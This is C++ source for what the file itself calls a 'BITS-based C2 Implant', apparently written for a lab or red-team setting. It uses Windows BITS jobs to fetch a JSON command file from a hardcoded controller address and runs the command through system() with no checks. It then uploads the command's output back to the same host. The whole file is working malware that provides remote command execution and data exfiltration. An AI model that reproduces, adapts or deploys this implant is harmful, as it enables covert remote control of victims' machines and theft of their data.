#include <windows.h>
#include <bits.h>
#include <iostream>
#include <fstream>
#include <string>
#include "json.hpp" // Include nlohmann JSON library

using json = nlohmann::json; // Alias for convenience

#define COMMAND_URL L"http://192.168.12.128/commands/command.json"
#define UPLOAD_URL L"http://192.168.12.128/uploads/response.txt"
#define LOCAL_COMMAND_FILE "C:\\Users\\smail\\Desktop\\command.json"
#define LOCAL_RESULT_FILE "C:\\Users\\smail\\Desktop\\response.txt"

HRESULT InitializeCOM() {
    return CoInitializeEx(NULL, COINIT_MULTITHREADED);
}

HRESULT CreateBITSManager(IBackgroundCopyManager** pManager) {
    return CoCreateInstance(__uuidof(BackgroundCopyManager), NULL, CLSCTX_LOCAL_SERVER,
                            __uuidof(IBackgroundCopyManager), (void**)pManager);
}

HRESULT DownloadFile(IBackgroundCopyManager* pManager) {
    IBackgroundCopyJob* pJob = NULL;
    GUID jobId;

    HRESULT hr = pManager->CreateJob(L"DownloadJob", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);
    if (SUCCEEDED(hr)) {
        pJob->AddFile(COMMAND_URL, L"C:\\Users\\smail\\Desktop\\command.json");
        pJob->Resume();

        BG_JOB_STATE state;
        do {
            Sleep(1000);
            pJob->GetState(&state);
        } while (state == BG_JOB_STATE_TRANSFERRING);

        if (state == BG_JOB_STATE_TRANSFERRED) {
            pJob->Complete();
            std::cout << "[+] File downloaded successfully." << std::endl;
        } else {
            std::cerr << "[-] File download failed. State: " << state << std::endl;
        }
        pJob->Release();
    } else {
        std::cerr << "[-] Failed to create download job. HRESULT: " << hr << std::endl;
    }
    return hr;
}

HRESULT UploadFile(IBackgroundCopyManager* pManager) {
    IBackgroundCopyJob* pJob = NULL;
    GUID jobId;

    HRESULT hr = pManager->CreateJob(L"UploadJob", BG_JOB_TYPE_UPLOAD, &jobId, &pJob);
    if (SUCCEEDED(hr)) {
        hr = pJob->AddFile(UPLOAD_URL, L"C:\\Users\\smail\\Desktop\\response.txt");
        if (FAILED(hr)) {
            std::cerr << "[-] Failed to add file to upload job. HRESULT: " << hr << std::endl;
            pJob->Release();
            return hr;
        }

        hr = pJob->Resume();
        if (FAILED(hr)) {
            std::cerr << "[-] Failed to resume upload job. HRESULT: " << hr << std::endl;
            pJob->Release();
            return hr;
        }

        BG_JOB_STATE state;
        do {
            Sleep(1000);
            pJob->GetState(&state);
            std::cout << "[*] Upload job state: " << state << std::endl;
        } while (state == BG_JOB_STATE_TRANSFERRING);

        if (state == BG_JOB_STATE_TRANSFERRED) {
            hr = pJob->Complete();
            if (SUCCEEDED(hr)) {
                std::cout << "[+] File uploaded successfully." << std::endl;
            } else {
                std::cerr << "[-] Failed to complete upload job. HRESULT: " << hr << std::endl;
            }
        } else {
            std::cerr << "[-] Upload failed. Final State: " << state << std::endl;
        }
        pJob->Release();
    } else {
        std::cerr << "[-] Failed to create upload job. HRESULT: " << hr << std::endl;
    }
    return hr;
}

std::string readCommandFromFile(const std::string& filePath) {
    std::ifstream file(filePath);
    if (!file.is_open()) {
        std::cerr << "[-] Failed to open command file." << std::endl;
        return "";
    }

    try {
        json commandJson;
        file >> commandJson; // Parse JSON content
        file.close();

        return commandJson["command"].get<std::string>(); // Extract the "command" key
    } catch (const std::exception& e) {
        std::cerr << "[-] Error parsing JSON: " << e.what() << std::endl;
        file.close();
        return "";
    }
}

void executeCommand(const std::string& command) {
    if (command.empty()) {
        std::cerr << "[-] No command to execute." << std::endl;
        return;
    }

    std::cout << "[*] Executing command: " << command << std::endl;
    std::string resultFile = LOCAL_RESULT_FILE;

    // Execute the command and redirect output to result file
    std::string fullCommand = command + " > " + resultFile + " 2>&1";
    int returnCode = system(fullCommand.c_str());

    if (returnCode == 0) {
        std::cout << "[+] Command executed successfully." << std::endl;
    } else {
        std::cerr << "[-] Command execution failed with return code: " << returnCode << std::endl;
    }
}

int main() {
    HRESULT hr;
    IBackgroundCopyManager* pManager = NULL;

    std::cout << "[*] Starting BITS-based C2 Implant..." << std::endl;

    hr = InitializeCOM();
    if (FAILED(hr)) {
        std::cerr << "[-] Failed to initialize COM. HRESULT: " << hr << std::endl;
        return 1;
    }

    hr = CreateBITSManager(&pManager);
    if (FAILED(hr)) {
        std::cerr << "[-] Failed to create BITS manager. HRESULT: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    // Download command file
    if (SUCCEEDED(DownloadFile(pManager))) {
        std::string command = readCommandFromFile(LOCAL_COMMAND_FILE);
        executeCommand(command);
    }

    // Upload result file
    if (FAILED(UploadFile(pManager))) {
        std::cerr << "[-] File upload encountered errors." << std::endl;
    }

    if (pManager) pManager->Release();
    CoUninitialize();

    return 0;
}
